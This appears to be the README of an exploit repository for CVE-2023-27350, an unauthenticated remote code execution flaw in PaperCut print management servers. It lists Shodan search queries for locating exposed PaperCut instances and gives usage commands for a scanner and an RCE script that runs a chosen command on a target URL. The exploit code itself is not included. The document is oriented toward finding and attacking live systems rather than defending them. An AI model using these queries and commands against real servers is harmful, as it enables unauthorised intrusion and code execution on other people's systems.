# PaperCut
CVE-2023-27350. PaperCut - Unauthenticated Remote Code Execution
## Shodan dork
    http.html:"papercut"
    http.html:"papercut" port:9191
    http.title:"PaperCut Login"  
## Usage <br/>
#### Check
    python3 scanner.py
    Enter IP:
#### RCE    
    python3 papercut_rce.py --url 'http://ip:9191' --command calc.exe
